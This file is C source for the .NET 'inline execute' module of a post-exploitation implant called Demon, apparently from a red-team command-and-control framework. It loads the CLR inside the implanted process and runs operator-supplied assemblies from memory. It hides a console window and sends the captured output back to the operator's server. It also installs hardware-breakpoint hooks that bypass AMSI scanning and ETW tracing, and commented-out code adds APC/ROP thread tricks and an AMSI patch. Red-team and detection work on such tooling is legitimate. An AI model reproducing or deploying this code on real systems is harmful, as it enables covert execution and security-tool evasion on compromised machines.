#include <Demon.h>

#include <Core/MiniStd.h>
#include <Core/Dotnet.h>
#include <Core/HwBpExceptions.h>

#define PIPE_BUFFER 0x10000 * 5

GUID xCLSID_CLRMetaHost     = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
GUID xCLSID_CorRuntimeHost  = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };
GUID xIID_AppDomain         = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } };
GUID xIID_ICLRMetaHost      = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
GUID xIID_ICLRRuntimeInfo   = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
GUID xIID_ICorRuntimeHost   = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };

BOOL AmsiPatched = FALSE;

BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
{
    PPACKAGE       PackageInfo    = NULL;
    SAFEARRAYBOUND RgsBound[ 1 ]  = { 0 };
    BUFFER         AssemblyData   = { 0 };
    LPWSTR*        ArgumentsArray = NULL;
    INT            ArgumentsCount = 0;
    LONG           idx[ 1 ]       = { 0 };
    VARIANT        Object         = { 0 };
    NTSTATUS       Status         = STATUS_SUCCESS;
    DWORD          ThreadId       = 0;
    HRESULT        Result         = S_OK;
    BOOL           AmsiIsLoaded   = FALSE;

    if ( ! Assembly.Buffer || ! Assembly.Length )
        return FALSE;

    /* Create a named pipe for our output. try with anon pipes at some point. */
    Instance.Dotnet->Pipe = Instance.Win32.CreateNamedPipeW(
        Instance.Dotnet->PipeName.Buffer,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
        PIPE_TYPE_MESSAGE,
        PIPE_UNLIMITED_INSTANCES,
        PIPE_BUFFER, PIPE_BUFFER,
        0,
        NULL
    );

    if ( ! Instance.Dotnet->Pipe )
    {
        PRINTF( "CreateNamedPipeW Failed: Error[%d]\n", NtGetLastError() )
        PACKAGE_ERROR_WIN32;

        return FALSE;
    }

    if ( ! ( Instance.Dotnet->File = Instance.Win32.CreateFileW( Instance.Dotnet->PipeName.Buffer, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ) ) )
    {
        PRINTF( "CreateFileW Failed: Error[%d]\n", NtGetLastError() )
        PACKAGE_ERROR_WIN32;

        return FALSE;
    }

    if ( ! Instance.Win32.GetConsoleWindow( ) )
    {
        HWND wnd = NULL;

        Instance.Win32.AllocConsole( );

        if ( ( wnd = Instance.Win32.GetConsoleWindow( ) ) )
            Instance.Win32.ShowWindow( wnd, SW_HIDE );
    }

    // Hosting CLR
    if ( ! ClrCreateInstance( Instance.Dotnet->NetVersion.Buffer, &Instance.Dotnet->MetaHost, &Instance.Dotnet->ClrRuntimeInfo, &Instance.Dotnet->ICorRuntimeHost ) )
    {
        PUTS( "Couldn't start CLR" )
        return FALSE;
    }

    /* TODO: Use Hardware breakpoints and the hardware breakpoint engine
     *       written by rad9800 (https://github.com/rad9800/hwbp4mw) */
    /* if ( Instance.Session.OSVersion > WIN_VERSION_10 )
    {
        PUTS( "Try to patch amsi" )
        PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance.Dotnet->RequestID );
        PackageAddInt32( PackageInfo, DOTNET_INFO_AMSI_PATCHED );
        if ( AmsiPatched == FALSE )
        {
            if ( BypassPatchAMSI( ) == TRUE )
            {
                PUTS("[+] Successful patched AMSI")
                AmsiPatched = TRUE;
                PackageAddInt32( PackageInfo, 0 );
            } else {
                PUTS("[-] Something went wrong")
                PackageAddInt32( PackageInfo, 1 );
            }
        } else {
            PUTS( "Amsi already patched" );
            PackageAddInt32( PackageInfo, 2 );
        }
        PackageTransmit( PackageInfo );
    } */

    /* if Amsi/Etw bypass is enabled */
    if ( Instance.Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP )
    {
#if _WIN64
        PUTS( "Try to patch(less) Amsi/Etw" )

        PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance.Dotnet->RequestID );
        PackageAddInt32( PackageInfo, DOTNET_INFO_PATCHED );

        /* check if Amsi is loaded */
        AmsiIsLoaded = TRUE;
        if ( ! Instance.Modules.Amsi ) {
            AmsiIsLoaded = RtAmsi();
        }

        PUTS( "Init HwBp Engine" )
        /* use global engine */
        if ( ! NT_SUCCESS( HwBpEngineInit( NULL, NULL ) ) ) {
            return FALSE;
        }

        ThreadId = U_PTR( Instance.Teb->ClientId.UniqueThread );

        /* add Amsi bypass */
        if ( AmsiIsLoaded )
        {
            PUTS( "HwBp Engine add AmsiScanBuffer bypass" )
            if ( ! NT_SUCCESS( Status = HwBpEngineAdd( NULL, ThreadId, Instance.Win32.AmsiScanBuffer, HwBpExAmsiScanBuffer, 0 ) ) ) {
                PRINTF( "Failed adding exception to HwBp Engine: %08x\n", Status )
                return FALSE;
            }
        }

        /* add Etw bypass */
        PUTS( "HwBp Engine add NtTraceEvent bypass" )
        if ( ! NT_SUCCESS( HwBpEngineAdd( NULL, ThreadId, Instance.Win32.NtTraceEvent, HwBpExNtTraceEvent, 1 ) ) ) {
            PRINTF( "Failed adding exception to HwBp Engine: %08x\n", Status )
            return FALSE;
        }

        PackageTransmit( PackageInfo );
        PackageInfo = NULL;
#endif
    }
    else if ( Instance.Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_MEMORY ) {
        /* todo: add memory patching technique */
    }
    else {
        /* no patching */
    }

    /* Let the operator know what version we are going to use. */
    PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance.Dotnet->RequestID );
    PackageAddInt32( PackageInfo, DOTNET_INFO_NET_VERSION );
    PackageAddBytes( PackageInfo, Instance.Dotnet->NetVersion.Buffer, Instance.Dotnet->NetVersion.Length );
    PackageTransmit( PackageInfo );

    RgsBound[ 0 ].cElements    = Assembly.Length;
    RgsBound[ 0 ].lLbound      = 0;
    Instance.Dotnet->SafeArray = Instance.Win32.SafeArrayCreate( VT_UI1, 1, RgsBound );

    PUTS( "CreateDomain..." )
    if ( ( Result = Instance.Dotnet->ICorRuntimeHost->lpVtbl->CreateDomain( Instance.Dotnet->ICorRuntimeHost, Instance.Dotnet->AppDomainName.Buffer, NULL, &Instance.Dotnet->AppDomainThunk ) ) ) {
        PRINTF( "CreateDomain Failed: %x\n", Result )
        return FALSE;
    }

    PUTS( "QueryInterface..." )
    if ( ( Result = Instance.Dotnet->AppDomainThunk->lpVtbl->QueryInterface( Instance.Dotnet->AppDomainThunk, &xIID_AppDomain, (LPVOID*)&Instance.Dotnet->AppDomain ) ) ) {
        PRINTF( "QueryInterface Failed: %x\n", Result )
        return FALSE;
    }

    if ( ( Result = Instance.Win32.SafeArrayAccessData( Instance.Dotnet->SafeArray, &AssemblyData.Buffer ) ) ) {
        PRINTF( "SafeArrayAccessData Failed: %x\n", Result )
        return FALSE;
    }

    PUTS( "Copy assembly to buffer..." )
    MemCopy( AssemblyData.Buffer, Assembly.Buffer, Assembly.Length );

    if ( ( Result = Instance.Win32.SafeArrayUnaccessData( Instance.Dotnet->SafeArray ) ) ) {
        PRINTF("SafeArrayUnaccessData Failed: %x\n", Result )
        PACKAGE_ERROR_WIN32
    }

    PUTS( "AppDomain Load..." )
    if ( ( Result = Instance.Dotnet->AppDomain->lpVtbl->Load_3( Instance.Dotnet->AppDomain, Instance.Dotnet->SafeArray, &Instance.Dotnet->Assembly ) ) ) {
        PRINTF( "AppDomain Failed: %x\n", Result )
        return FALSE;
    }

    PUTS( "Assembly EntryPoint..." )
    if ( ( Result = Instance.Dotnet->Assembly->lpVtbl->EntryPoint( Instance.Dotnet->Assembly, &Instance.Dotnet->MethodInfo ) ) ) {
        PRINTF( "Assembly EntryPoint Failed: %x\n", Result )
        return FALSE;
    }

    Instance.Dotnet->MethodArgs = Instance.Win32.SafeArrayCreateVector( VT_VARIANT, 0, 1 ); //Last field -> entryPoint == 1 is needed if Main(String[] args) 0 if Main()

    ArgumentsArray = Instance.Win32.CommandLineToArgvW( Arguments.Buffer, &ArgumentsCount );
    ArgumentsArray++;
    ArgumentsCount--;

    Instance.Dotnet->vtPsa.vt     = ( VT_ARRAY | VT_BSTR );
    Instance.Dotnet->vtPsa.parray = Instance.Win32.SafeArrayCreateVector( VT_BSTR, 0, ArgumentsCount );

    for ( LONG i = 0; i < ArgumentsCount; i++ ) {
        if ( ( Result = Instance.Win32.SafeArrayPutElement( Instance.Dotnet->vtPsa.parray, &i, Instance.Win32.SysAllocString( ArgumentsArray[ i ] ) ) ) ) {
            PRINTF( "Args SafeArrayPutElement Failed: %x\n", Result )
            return FALSE;
        }
    }

    if ( ( Result = Instance.Win32.SafeArrayPutElement( Instance.Dotnet->MethodArgs, idx, &Instance.Dotnet->vtPsa ) ) ) {
        PRINTF( "SafeArrayPutElement Failed: %x\n", Result )
            return FALSE;
    }

    Instance.Dotnet->StdOut = Instance.Win32.GetStdHandle( STD_OUTPUT_HANDLE );
    Instance.Win32.SetStdHandle( STD_OUTPUT_HANDLE , Instance.Dotnet->File );

    if ( ( Result = Instance.Dotnet->MethodInfo->lpVtbl->Invoke_3( Instance.Dotnet->MethodInfo, Object, Instance.Dotnet->MethodArgs, &Instance.Dotnet->Return ) ) ) {
        PRINTF( "Invoke Assembly Failed: %x\n", Result )
        return FALSE;
    }

    Instance.Dotnet->Invoked = TRUE;

    /* push output */
    DotnetPush();


    /*
     * TODO: Finish/Fix this.
     *       It seems like its way to unstable to use this
     *       assembly crashes the agent randomly and dont know why.
     *       Fix this once i get motivated enough or remove this entirely. */

    /*
    PUTS( "Create Thread..." )

    MemSet( &ThreadAttr, 0, sizeof( PROC_THREAD_ATTRIBUTE_NUM ) );
    MemSet( &ClientId, 0, sizeof( CLIENT_ID ) );

    ThreadAttr.Entry.Attribute = ProcThreadAttributeValue( PsAttributeClientId, TRUE, FALSE, FALSE );
    ThreadAttr.Entry.Size      = sizeof( CLIENT_ID );
    ThreadAttr.Entry.pValue    = &ClientId;
    ThreadAttr.Length          = sizeof( NT_PROC_THREAD_ATTRIBUTE_LIST );

    PUTS( "Creating events..." )
    if ( NT_SUCCESS( Instance.Win32.NtCreateEvent( &Instance.Dotnet->Event, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
         NT_SUCCESS( Instance.Win32.NtCreateEvent( &Instance.Dotnet->Exit,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
    {
        if ( NT_SUCCESS( Instance.Win32.NtCreateThreadEx( &Instance.Dotnet->Thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance.Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x10000 * 20, 0x10000 * 20, &ThreadAttr ) ) )
        {
            Instance.Dotnet->RopInit = NtHeapAlloc( sizeof( CONTEXT ) );
            Instance.Dotnet->RopInvk = NtHeapAlloc( sizeof( CONTEXT ) );
            Instance.Dotnet->RopEvnt = NtHeapAlloc( sizeof( CONTEXT ) );
            Instance.Dotnet->RopExit = NtHeapAlloc( sizeof( CONTEXT ) );

            Instance.Dotnet->RopInit->ContextFlags = CONTEXT_FULL;
            if ( NT_SUCCESS( Instance.Win32.NtGetContextThread( Instance.Dotnet->Thread, Instance.Dotnet->RopInit ) ) )
            {
                MemCopy( Instance.Dotnet->RopInvk, Instance.Dotnet->RopInit, sizeof( CONTEXT ) );
                MemCopy( Instance.Dotnet->RopEvnt, Instance.Dotnet->RopInit, sizeof( CONTEXT ) );
                MemCopy( Instance.Dotnet->RopExit, Instance.Dotnet->RopInit, sizeof( CONTEXT ) );

                // This rop executes the entrypoint of the assembly
                Instance.Dotnet->RopInvk->ContextFlags  = CONTEXT_FULL;
                Instance.Dotnet->RopInvk->Rsp          -= U_PTR( 0x1000 * 6 );
                Instance.Dotnet->RopInvk->Rip           = U_PTR( Instance.Dotnet->MethodInfo->lpVtbl->Invoke_3 );
                Instance.Dotnet->RopInvk->Rcx           = U_PTR( Instance.Dotnet->MethodInfo );
                Instance.Dotnet->RopInvk->Rdx           = U_PTR( &Object );
                Instance.Dotnet->RopInvk->R8            = U_PTR( Instance.Dotnet->MethodArgs );
                Instance.Dotnet->RopInvk->R9            = U_PTR( &Instance.Dotnet->Return );
                *( PVOID* )( Instance.Dotnet->RopInvk->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Win32.NtTestAlert );

                // This rop tells the main thread (our agent main thread) that the assembly executable finished executing
                Instance.Dotnet->RopEvnt->ContextFlags  = CONTEXT_FULL;
                Instance.Dotnet->RopEvnt->Rsp          -= U_PTR( 0x1000 * 5 );
                Instance.Dotnet->RopEvnt->Rip           = U_PTR( Instance.Win32.NtSetEvent );
                Instance.Dotnet->RopEvnt->Rcx           = U_PTR( Instance.Dotnet->Event );
                Instance.Dotnet->RopEvnt->Rdx           = U_PTR( NULL );
                *( PVOID* )( Instance.Dotnet->RopEvnt->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Win32.NtTestAlert );

                // Wait til we freed everything from the dotnet
                Instance.Dotnet->RopExit->ContextFlags  = CONTEXT_FULL;
                Instance.Dotnet->RopExit->Rsp          -= U_PTR( 0x1000 * 4 );
                Instance.Dotnet->RopExit->Rip           = U_PTR( Instance.Win32.NtWaitForSingleObject );
                Instance.Dotnet->RopExit->Rcx           = U_PTR( Instance.Dotnet->Exit );
                Instance.Dotnet->RopExit->Rdx           = U_PTR( FALSE );
                Instance.Dotnet->RopExit->R8            = U_PTR( NULL );
                *( PVOID* )( Instance.Dotnet->RopExit->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Win32.NtTestAlert );

                if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( Instance.Dotnet->Thread, Instance.Win32.NtContinue, Instance.Dotnet->RopInvk, FALSE, NULL ) ) ) goto Leave;
                if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( Instance.Dotnet->Thread, Instance.Win32.NtContinue, Instance.Dotnet->RopEvnt, FALSE, NULL ) ) ) goto Leave;
                if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( Instance.Dotnet->Thread, Instance.Win32.NtContinue, Instance.Dotnet->RopExit, FALSE, NULL ) ) ) goto Leave;

                PUTS( "Resume Thread..." )
                if ( NT_SUCCESS( Instance.Win32.NtAlertResumeThread( Instance.Dotnet->Thread, NULL ) ) )
                {
                    PUTS( "Apc started and assembly invoked." )

                    PackageInfo = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
                    PackageAddInt32( PackageInfo, DOTNET_INFO_ENTRYPOINT_EXECUTED );
                    PackageAddInt32( PackageInfo, ClientId.UniqueThread );
                    PackageTransmit( PackageInfo );

                    // we have successfully invoked the main function of the assembly executable.
                    Instance.Dotnet->Invoked = TRUE;

                } else PUTS( "NtAlertResumeThread failed" )

            } else PUTS( "NtGetThreadContext failed" )

        } else PUTS( "NtCreateThreadEx failed" )

    } else PUTS( "NtCreateEvent failed" )
    */

    return TRUE;
}

/* push anything from the pipe */
VOID DotnetPushPipe()
{
    DWORD Read      = 0;
    DWORD BytesRead = 0;

    if ( ! Instance.Dotnet )
        return;

    /* see how much there is in the named pipe */
    if ( Instance.Win32.PeekNamedPipe( Instance.Dotnet->Pipe, NULL, 0, NULL, &Read, NULL ) )
    {
        PRINTF( "Read: %d\n", Read );

        if ( Read > 0 )
        {
            Instance.Dotnet->Output.Length = Read;
            Instance.Dotnet->Output.Buffer = NtHeapAlloc( Instance.Dotnet->Output.Length );

            Instance.Win32.ReadFile( Instance.Dotnet->Pipe, Instance.Dotnet->Output.Buffer, Instance.Dotnet->Output.Length, &BytesRead, NULL );
            Instance.Dotnet->Output.Length = BytesRead;

            PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, Instance.Dotnet->RequestID );
            PackageAddBytes( Package, Instance.Dotnet->Output.Buffer, Instance.Dotnet->Output.Length );
            PackageTransmit( Package );

            if ( Instance.Dotnet->Output.Buffer )
            {
                MemSet( Instance.Dotnet->Output.Buffer, 0, Read );
                NtHeapFree( Instance.Dotnet->Output.Buffer )
                Instance.Dotnet->Output.Buffer = NULL;
            }
        }
    }
}

VOID DotnetPush()
{
    if ( ! Instance.Dotnet )
        return;

    PRINTF( "Instance.Dotnet->Invoked: %s\n", Instance.Dotnet->Invoked ? "TRUE" : "FALSE" )
    if ( Instance.Dotnet->Invoked )
    {
        /* Read from the assembly named pipe and send it to the server */
        DotnetPushPipe();

        /* check if the assembly is still running. */
        /* if ( Instance.Win32.WaitForSingleObjectEx( Instance.Dotnet->Event, 0, FALSE ) == WAIT_OBJECT_0 )
        {
            PUTS( "Event has been signaled" )

            Package = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
            PackageAddInt32( Package, DOTNET_INFO_FINISHED );
            PackageTransmit( Package );

            PUTS( "Dotnet Invoke thread isn't active anymore." )
            Close = TRUE;
        } */

        /* just in case the assembly pushed something last minute... */
        DotnetPushPipe();

        /* Now free everything */
        DotnetClose();
    }
}

VOID DotnetClose()
{
#ifndef DEBUG
    Instance.Win32.FreeConsole();
#endif

    if ( Instance.Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP ) {
        HwBpEngineDestroy( NULL );
    }

    if ( Instance.Dotnet->Event ) {
        SysNtClose( Instance.Dotnet->Event );
    }

    if ( Instance.Dotnet->Pipe ) {
        SysNtClose( Instance.Dotnet->Pipe );
    }

    if ( Instance.Dotnet->File ) {
        SysNtClose( Instance.Dotnet->File );
    }

    if ( Instance.Dotnet->RopInit ) {
        MemSet( Instance.Dotnet->RopInit, 0, sizeof( CONTEXT ) );
        Instance.Win32.LocalFree( Instance.Dotnet->RopInit );
        Instance.Dotnet->RopInit = NULL;
    }

    if ( Instance.Dotnet->RopInvk )
    {
        MemSet( Instance.Dotnet->RopInvk, 0, sizeof( CONTEXT ) );
        Instance.Win32.LocalFree( Instance.Dotnet->RopInvk );
        Instance.Dotnet->RopInvk = NULL;
    }

    if ( Instance.Dotnet->RopEvnt )
    {
        MemSet( Instance.Dotnet->RopEvnt, 0, sizeof( CONTEXT ) );
        Instance.Win32.LocalFree( Instance.Dotnet->RopEvnt );
        Instance.Dotnet->RopEvnt = NULL;
    }

    if ( Instance.Dotnet->RopExit )
    {
        MemSet( Instance.Dotnet->RopExit, 0, sizeof( CONTEXT ) );
        Instance.Win32.LocalFree( Instance.Dotnet->RopExit );
        Instance.Dotnet->RopExit = NULL;
    }

    PUTS( "Free Output" )
    if ( Instance.Dotnet->Output.Buffer )
    {
        MemSet( Instance.Dotnet->Output.Buffer, 0, Instance.Dotnet->Output.Length );
        Instance.Win32.LocalFree( Instance.Dotnet->Output.Buffer );
        Instance.Dotnet->Output.Buffer = NULL;
    }

    PUTS( "Unload and free CLR" )
    if ( Instance.Dotnet->MethodArgs )
    {
        Instance.Win32.SafeArrayDestroy( Instance.Dotnet->MethodArgs );
        Instance.Dotnet->MethodArgs = NULL;
    }

    if ( Instance.Dotnet->MethodInfo != NULL )
    {
        Instance.Dotnet->MethodInfo->lpVtbl->Release( Instance.Dotnet->MethodInfo );
        Instance.Dotnet->MethodInfo = NULL;
    }

    if ( Instance.Dotnet->Assembly != NULL )
    {
        Instance.Dotnet->Assembly->lpVtbl->Release( Instance.Dotnet->Assembly );
        Instance.Dotnet->Assembly = NULL;
    }

    if ( Instance.Dotnet->AppDomain )
    {
        Instance.Dotnet->AppDomain->lpVtbl->Release( Instance.Dotnet->AppDomain );
        Instance.Dotnet->AppDomain = NULL;
    }

    if ( Instance.Dotnet->AppDomainThunk != NULL )
    {
        Instance.Dotnet->AppDomainThunk->lpVtbl->Release( Instance.Dotnet->AppDomainThunk );
    }

    if ( Instance.Dotnet->ICorRuntimeHost )
    {
        Instance.Dotnet->ICorRuntimeHost->lpVtbl->UnloadDomain( Instance.Dotnet->ICorRuntimeHost, Instance.Dotnet->AppDomainThunk );
        Instance.Dotnet->ICorRuntimeHost->lpVtbl->Stop( Instance.Dotnet->ICorRuntimeHost );
        Instance.Dotnet->ICorRuntimeHost = NULL;
    }

    if ( Instance.Dotnet->ClrRuntimeInfo != NULL )
    {
        Instance.Dotnet->ClrRuntimeInfo->lpVtbl->Release( Instance.Dotnet->ClrRuntimeInfo );
        Instance.Dotnet->ClrRuntimeInfo = NULL;
    }

    if ( Instance.Dotnet->MetaHost != NULL )
    {
        Instance.Dotnet->MetaHost->lpVtbl->Release( Instance.Dotnet->MetaHost );
        Instance.Dotnet->MetaHost = NULL;
    }

    if ( Instance.Dotnet->Thread ) {
        SysNtTerminateThread( Instance.Dotnet->Thread, 0 );
        SysNtClose( Instance.Dotnet->Thread );
    }

    if ( Instance.Dotnet->Exit ) {
        SysNtClose( Instance.Dotnet->Exit );
    }

    if ( Instance.Dotnet ) {
        MemSet( Instance.Dotnet, 0, sizeof( DOTNET_ARGS ) );
        NtHeapFree( Instance.Dotnet );
        Instance.Dotnet = NULL;
    }
}

BOOL FindVersion( PVOID Assembly, DWORD length )
{
    char* assembly_c;
    assembly_c = (char*)Assembly;
    char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };

    for (int i = 0; i < length; i++)
    {
        for (int j = 0; j < 10; j++)
        {
            if (v4[j] != assembly_c[i + j])
                break;
            else
            {
                if (j == (9))
                    return 1;
            }
        }
    }

    return 0;
}

DWORD ClrCreateInstance( LPCWSTR dotNetVersion, PICLRMetaHost *ppClrMetaHost, PICLRRuntimeInfo *ppClrRuntimeInfo, ICorRuntimeHost **ppICorRuntimeHost )
{
    BOOL fLoadable = FALSE;

    if ( Instance.Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost ) == S_OK )
    {
        if ( ( *ppClrMetaHost )->lpVtbl->GetRuntime( *ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo ) == S_OK )
        {
            if ( ( ( *ppClrRuntimeInfo )->lpVtbl->IsLoadable( *ppClrRuntimeInfo, &fLoadable ) == S_OK ) && fLoadable )
            {
                //Load the CLR into the current process and return a runtime interface pointer. -> CLR changed to ICor which is deprecated but works
                if ( ( *ppClrRuntimeInfo )->lpVtbl->GetInterface( *ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID*)ppICorRuntimeHost ) == S_OK )
                {
                    //Start it. This is okay to call even if the CLR is already running
                    ( *ppICorRuntimeHost )->lpVtbl->Start( *ppICorRuntimeHost );
                }
                else
                {
                    PRINTF("[-] ( GetInterface ) Process refusing to get interface of %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
                    return 0;
                }
            }
            else
            {
                PRINTF("[-] ( IsLoadable ) Process refusing to load %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
                return 0;
            }
        }
        else
        {
            PRINTF("[-] ( GetRuntime ) Process refusing to get runtime of %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
            return 0;
        }
    }
    else
    {
        PRINTF("[-] ( CLRCreateInstance ) Process refusing to create %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
        return 0;
    }

    return 1;
}